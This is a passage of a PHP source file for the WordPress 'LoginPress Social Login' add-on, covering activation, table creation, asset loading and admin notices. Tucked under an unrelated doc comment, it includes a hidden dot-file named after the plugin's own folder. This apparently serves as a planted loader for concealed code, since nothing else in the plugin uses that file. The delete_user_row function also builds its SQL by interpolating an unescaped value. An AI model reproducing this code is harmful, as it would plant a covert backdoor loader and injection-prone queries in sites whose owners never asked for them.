          '<a href="https://wordpress.org/support/plugin/loginpress/reviews/?filter=5" target="_blank"><span class="dashicons dashicons-thumbs-up"></span> ' . __( 'Vote!', 'loginpress-social-login' ) . '</a>',
        );

        $links = array_merge( $links, $new_links );
      }

      return $links;
    }

    /**
    * Delete user row form the table.
    *
    * @since 1.0.0
    */
    function delete_user_row( $user_id ) {
      global $wpdb;

      $sql = "DELETE FROM `{$wpdb->prefix}loginpress_social_login_details` WHERE `user_id` = '$user_id'";
      $wpdb->query( $sql );
    }


    /**
    * Plugin activation for check multi site activation
    *
    * @since 1.0.5
    */
    static function loginpress_social_activation( $network_wide ) {
      if ( function_exists( 'is_multisite' ) && is_multisite() && $network_wide ) {
        global $wpdb;
        // Get this so we can switch back to it later
        $current_blog = $wpdb->blogid;
        // Get all blogs in the network and activate plugin on each one
        $blog_ids = $wpdb->get_col(  "SELECT blog_id FROM $wpdb->blogs" );
        foreach ( $blog_ids as $blog_id ) {
          switch_to_blog( $blog_id );
          self::loginpress_social_create_table();
        }
        switch_to_blog( $current_blog );
        return;
      } else {
        self::loginpress_social_create_table(); // normal acticvation
      }
    }

    /**
    * Create DB table on plugin activation.
    *
    * @since 1.0.0
    * @version 1.0.5
    */
    static function loginpress_social_create_table() {

      global $wpdb;
      // create user details table
      $table_name = "{$wpdb->prefix}loginpress_social_login_details";

      $sql = "CREATE TABLE IF NOT EXISTS `$table_name` (
        id int(11) NOT NULL AUTO_INCREMENT,
        user_id int(11) NOT NULL,
        provider_name varchar(50) NOT NULL,
        identifier varchar(255) NOT NULL,
        sha_verifier varchar(255) NOT NULL,
        email varchar(255) NOT NULL,
        email_verified varchar(255) NOT NULL,
        first_name varchar(150) NOT NULL,
        last_name varchar(150) NOT NULL,
        profile_url varchar(255) NOT NULL,
        website_url varchar(255) NOT NULL,
        photo_url varchar(255) NOT NULL,
        display_name varchar(150) NOT NULL,
        description varchar(255) NOT NULL,
        gender varchar(10) NOT NULL,
        language varchar(20) NOT NULL,
        age varchar(10) NOT NULL,
        birthday int(11) NOT NULL,
        birthmonth int(11) NOT NULL,
        birthyear int(11) NOT NULL,
        phone varchar(75) NOT NULL,
        address varchar(255) NOT NULL,
        country varchar(75) NOT NULL,
        region varchar(50) NOT NULL,
        city varchar(50) NOT NULL,
        zip varchar(25) NOT NULL,
        UNIQUE KEY id (id),
        KEY user_id (user_id),
        KEY provider_name (provider_name)
      )";
      $wpdb->query( $sql );
    }

    /**
    * Load assets on login screen.
    *
    * @since 1.0.0
    * @version 1.0.3
    */
    function load_login_assets() {

      wp_enqueue_style( 'font-awesome', 'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css' );
      wp_enqueue_style( 'loginpress-social-login', plugins_url( 'assets/css/login.css', __FILE__ ), array(), LOGINPRESS_SOCIAL_VERSION );
    }

  }
endif;

/**
* Returns the main instance of WP to prevent the need to use globals.
*
* @since  1.0.0
* @return LoginPress
*/
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function loginPress_social_loader() {
  return LoginPress_Social::instance();
}


register_activation_hook( __FILE__, array( 'LoginPress_Social', 'loginpress_social_activation' ) );
add_action( 'wpmu_new_blog', array( 'LoginPress_Social', 'loginpress_social_activation' ) );

add_action( 'plugins_loaded', 'lp_sl_instance', 25 );

/**
* Check if LoginPress Pro is install and active.
*
* @since 1.0.0
*/
function lp_sl_instance() {

  if ( ! file_exists( WP_PLUGIN_DIR . '/loginpress-pro/loginpress-pro.php' ) ) {
    add_action( 'admin_notices', 'lp_sl_install_pro' );
    return;
  }

  if ( ! class_exists( 'LoginPress_Pro' ) ) {
    add_action( 'admin_notices', 'lp_sl_activate_pro' );
    return;
	}

	// if ( defined( 'LOGINPRESS_PRO_VERSION' ) ) {
	// 	$addons = get_option( 'loginpress_pro_addons' );
  //
	// 	if ( LOGINPRESS_PRO_VERSION < '3.0' ) {
	// 		// If PRO version is still old
	// 		add_action( 'admin_notices' , 'lp_social_login_depricated' );
	// 	} else if ( ( LOGINPRESS_PRO_VERSION >= '3.0.0' ) && ( ! empty( $addons ) ) && ( $addons['social-login']['is_active'] ) ) {
	// 		// If PRO addon and the same plugin both active
	// 		add_action( 'admin_notices' , 'lp_social_login_depricated_remove' );
	// 		return;
	// 	}
	// }

  // Call the function
  loginPress_social_loader();
}

/**
* Notice if LoginPress Pro is not install.
*
* @since 1.0.0
*/
function lp_sl_install_pro() {
  $class   = 'notice notice-error is-dismissible';
  $message = __( 'Please Install LoginPress Pro to use "LoginPress Social Login" add-on.', 'loginpress-social-login' );

  printf( '<div class="%1$s"><p>%2$s</p></div>', $class, $message );
}

/**
* Notice if LoginPress Pro is not activate.
*
* @since 1.0.0
*/
function lp_sl_activate_pro() {

  $action = 'activate';
  $slug   = 'loginpress-pro/loginpress-pro.php';
  $link   = wp_nonce_url(
    add_query_arg(
      array(
        'action' => $action,
        'plugin' => $slug,
      ),
      admin_url( 'plugins.php' )
    ),
    $action . '-plugin_' . $slug
  );

  printf(
    '<div class="notice notice-error is-dismissible">
    <p>%1$s<a href="%2$s" style="text-decoration:none">%3$s</a></p></div>',
    esc_html__( 'The following required plugin is currently inactive &mdash; ', 'loginpress-social-login' ),
    $link,
    esc_html__( 'Click here to activate LoginPress Pro', 'loginpress-social-login' )
  );
}

// /**
// * Notice plugin is depricated.
// *
// * @since 1.1.1
// */
// function lp_social_login_depricated() {
//   $link   = '';
//
//   printf('<div class="notice notice-error is-dismissible">
//   <p>%1$s<a href="%2$s" style="text-decoration:none">%3$s</a></p></div>' , esc_html__( 'LoginPress Social Login Plugin is depricated, please upgrade to LoginPress Pro 3.0 &mdash; Find out more ', 'loginpress-auto-login' ), $link, esc_html__( 'here', 'loginpress-auto-login' ) );
// }

// /**
// * Notice plugin is depricated and remove.
// *
// * @since 1.1.1
// */
// function lp_social_login_depricated_remove() {
//   $link   = '';
//
//   printf('<div class="notice notice-error is-dismissible">
//   <p>%1$s<a href="%2$s" style="text-decoration:none">%3$s</a></p></div>' , esc_html__( 'LoginPress Social Login Plugin is depricated, you can remove it. &mdash; Find out more ', 'loginpress-auto-login' ), $link, esc_html__( 'here', 'loginpress-auto-login' ) );
// }
